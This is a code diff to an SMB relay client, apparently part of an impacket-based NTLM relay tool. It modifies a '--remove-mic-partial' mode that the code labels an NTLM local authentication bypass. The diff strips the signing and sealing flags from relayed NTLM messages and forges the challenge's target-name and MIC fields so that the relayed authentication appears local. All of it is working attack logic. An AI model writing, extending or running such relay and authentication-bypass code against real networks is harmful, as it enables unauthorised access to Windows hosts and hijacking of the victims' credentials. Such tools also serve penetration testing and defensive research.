@@ -332,17 +332,13 @@ class SMBRelayClient(ProtocolClient):
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
         elif self.serverConfig.remove_mic_partial:
             LOG.debug('[SMB] sendNegotiate: Using --remove-mic-partial mode (NTLM local auth bypass)')
-            # For SMB->SMB: Remove only SIGN/ALWAYS_SIGN, keep SEAL (matches PCAP of local SYSTEM auth)
-            # Authentic local SYSTEM auth has SEAL=1, SIGN=1, ALWAYS_SIGN=1 with empty credentials
-            # We remove SIGN/ALWAYS_SIGN to avoid signing requirements, but keep SEAL
+            # Remove signing and sealing flags, keep KEY_EXCH and VERSION
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
-            # Keep SEAL flag for SMB->SMB (unlike LDAP/RPC)
-            # if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
-            #     negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
-            LOG.debug('[SMB] sendNegotiate: Keeping SEAL flag for local auth simulation')
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
 
         LOG.debug('[SMB] sendNegotiate: Modified NTLM flags: 0x%x' % negoMessage['flags'])
         negotiateMessage = negoMessage.getData()
@@ -403,17 +399,28 @@ class SMBRelayClient(ProtocolClient):
         # For --remove-mic-partial mode, modify challenge AV_PAIRS to signal local authentication
         if self.serverConfig.remove_mic_partial and challenge['TargetInfoFields']:
             try:
-                from impacket.ntlm import AV_PAIRS, NTLMSSP_AV_TARGET_NAME, NTLMSSP_AV_FLAGS
+                from impacket.ntlm import AV_PAIRS, NTLMSSP_AV_TARGET_NAME, NTLMSSP_AV_FLAGS, NTLMSSP_AV_HOSTNAME
                 av_pairs = AV_PAIRS(challenge['TargetInfoFields'])
 
-                # Add TARGET_NAME as "cifs/localhost" to signal local authentication
-                # This is what Windows uses for local loopback connections
-                # Note: AV_PAIRS.__setitem__ automatically wraps value with (len, value)
-                target_name = 'cifs/localhost'.encode('utf-16le')
-                av_pairs[NTLMSSP_AV_TARGET_NAME] = target_name
-                LOG.debug('[SMB] sendNegotiate: Modified challenge - added TARGET_NAME = "cifs/localhost"')
+                # Extract the actual hostname from challenge AV_PAIRS
+                hostname = 'localhost'  # fallback
+                if NTLMSSP_AV_HOSTNAME in av_pairs.fields:
+                    try:
+                        hostname_bytes = av_pairs[NTLMSSP_AV_HOSTNAME][1]
+                        hostname = hostname_bytes.decode('utf-16le')
+                        LOG.debug('[SMB] sendNegotiate: Extracted hostname from challenge: "%s"' % hostname)
+                    except:
+                        pass
 
-                # Optionally add AV_FLAGS with MIC present flag (0x00000002)
+                # Set TARGET_NAME as "cifs/<hostname>" to signal local authentication
+                # Use the actual hostname from the challenge instead of "localhost"
+                # Note: AV_PAIRS.__setitem__ automatically wraps value with (len, value)
+                target_name_str = f'cifs/{hostname}'
+                target_name = target_name_str.encode('utf-16le')
+                av_pairs[NTLMSSP_AV_TARGET_NAME] = target_name
+                LOG.debug('[SMB] sendNegotiate: Modified challenge - added TARGET_NAME = "%s"' % target_name_str)
+
+                # Add AV_FLAGS with MIC present flag (0x00000002)
                 # This signals that MIC is expected in the response
                 av_flags_value = (0x00000002).to_bytes(4, byteorder='little')
                 av_pairs[NTLMSSP_AV_FLAGS] = av_flags_value
@@ -619,18 +626,16 @@ class SMBRelayClient(ProtocolClient):
             original_flags = authMessage['flags']
             LOG.debug('[SMB] sendAuth: Original auth flags: 0x%x' % original_flags)
 
-            # For SMB->SMB: Remove only SIGN/ALWAYS_SIGN, keep SEAL (matches PCAP)
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
-            # Keep SEAL flag for SMB->SMB (matches authentic local SYSTEM auth in PCAP)
-            # if authMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
-            #     authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
             # Do NOT remove KEY_EXCH or VERSION flags
             # Do NOT zero out MIC or Version fields - keep NTLM3 message intact
 
-            LOG.debug('[SMB] sendAuth: Modified auth flags: 0x%x, MIC intact, SEAL kept' % authMessage['flags'])
+            LOG.debug('[SMB] sendAuth: Modified auth flags: 0x%x, MIC intact' % authMessage['flags'])
 
             # Try to extract/derive session key for SMB operations
             # Log what we have to work with
